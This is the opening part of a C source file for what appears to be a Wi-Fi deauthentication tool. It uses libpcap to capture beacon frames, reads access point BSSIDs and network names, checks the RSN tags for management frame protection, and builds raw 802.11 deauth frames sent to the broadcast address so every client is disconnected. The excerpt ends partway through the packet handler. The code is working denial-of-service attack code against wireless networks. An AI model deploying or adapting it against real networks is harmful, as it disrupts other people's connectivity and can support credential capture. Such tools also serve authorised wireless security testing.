/*
	MIT License

	Copyright (c) 2017 Ravjot Singh Samra

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

#define VERSION "1.0"

/* Define the macros below as empty if you do not want forced colours. */
#define CYAN "\x1b[1;36m"
#define GREEN "\x1b[1;32m"
#define YELLOW "\x1b[1;33m"
#define RED "\x1b[1;31m"
#define COLOUR_RESET "\x1b[0m"

const unsigned char EXAMPLE___deauthFrame___[34] = /* Seems to be a proper packet, created manually by hand. */
{
	0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, /* 802.11 deauthentication frame (type 0, subtype 12). */

	0x52, 0x41, 0x56, 0x4A, 0x4F, 0x54, /* Destination/Receiver. */

	0x52, 0x41, 0x56, 0x4A, 0x4F, 0x54, /* Source/Sender. */

	0x52, 0x41, 0x56, 0x4A, 0x4F, 0x54, /* Management frame's BSSID/Access Point. */

	0x00, 0x00,

	0x01, /* Reason code for deauthentication. https://www.cisco.com/assets/sol/sb/WAP371_Emulators/WAP371_Emulator_v1-0-1-5/help/Apx_ReasonCodes2.html . 0x01 is "unspecified". */

	0x00
};

unsigned char frameStart[18] =
{
	0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 

	0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF /* Address initially set to broadcast for all client deauthentication. */
};

unsigned char targets[100][12]; /* Array for avoiding duplication in prepared packet array, so all APs get equal deauth packets per iteration of the final array. */

const unsigned char frameEnd[4] =
{
	0x00, 0x00, 0x23, 0x00 /* Reason code is set to 0x23 for "authentication failure". Doesn't matter what's here, it works no matter which reason I believe. */
};

unsigned char frameFinal[100][34]; /* Stores full packets with address 2 and address 3 of the frame changed. Done so less `memcpy` functions are needed; although more memory is required to store the elements, it's faster. */

pcap_t *handle; /* Handle for the PCAP device which will be our WLAN adapter/card. */
struct bpf_program filter;
char filter_exp[] = "type mgt subtype beacon"; /* BPF (packet filter) for beacons only (type 0, subtype 8). */

int exiting; /* Should be defined as 0 by default due to scope. */

unsigned int i; /* Counter for how many unique frames have been created and are being sent. */
unsigned int d; /* Unsigned integer loop variable. */
int c; /* Signed integer loop variable. */

unsigned int captureLimit; /* Amount of targets to capture, unsigned or signed doesn't matter, never going to catch that many APs anyway. */
int captureLimitRetry; /* Restarts capture when limit reached. */

unsigned int ignoredAP[6];
int ignoreAP;

int showMoreInfo; /* Must be set to anything other than zero to do what it is named. */

struct __attribute__((__packed__))RSN
{
/* Max Bytes: */
	/* 1 */    unsigned char RSNtag;
	/* 1 */    unsigned char RSNlength; /* Place to store the tag's length in. */
	/* 2 */    unsigned char RSNversion; /* Double checks if we have actually found an RSN tag and not just a byte that is 0x30 with some supposed "length". */
	/* 4 */    unsigned char groupDataCipherSuite[4]; /* Got to parse the entire packet to avoid PMK caching giving false RSN capability results */
	/* 2 */    unsigned char pairwiseCipherSuiteCount; /* Same as above for all counts. */
	/* 4 */    unsigned char pairwiseCipherSuiteList; /* Unused. */
	/* 2 */    unsigned char AKMcipherSuiteCount;
	/* 4 */    unsigned char AKMcipherSuiteList; /* Unused. */
	/* 2 */    unsigned char RSNcapabilities; /* First byte contains required or capable values for frame management protection AKA what we want. Ignore everything after this. */
	/* 2 */    unsigned char PMKIDcount; /* PMK caching seems to be only used in enterprise 802.11 APs? */
	/* 16 */   unsigned char PMKIDlist;
};

void beaconCapture(__attribute__((unused))unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *beaconCaptured) /* Packet handler. */
{
	const unsigned char *target;
	const unsigned char *targetName;
	const unsigned char *targetNameLength;
	struct RSN parser;
	int packetSize; /* Required to "scan" the entire packet for the RSN tag. */
	int RSNabsent; /* RSN information is not a required field for beacon frames. */
	int protection[7]; /* Stores the binary dump of the first `RSNcapabilities` byte. May as well store the entire thing to show the user too. */

	target = beaconCaptured + beaconCaptured[2] + 10; /* Third byte is the length of the Radiotap header, we get that out of the way so we can find the BSSID we want in the IP header. */
	targetName = beaconCaptured + beaconCaptured[2] + 38; /* Same with the other one, except going to the WLAN ESSID offset. */
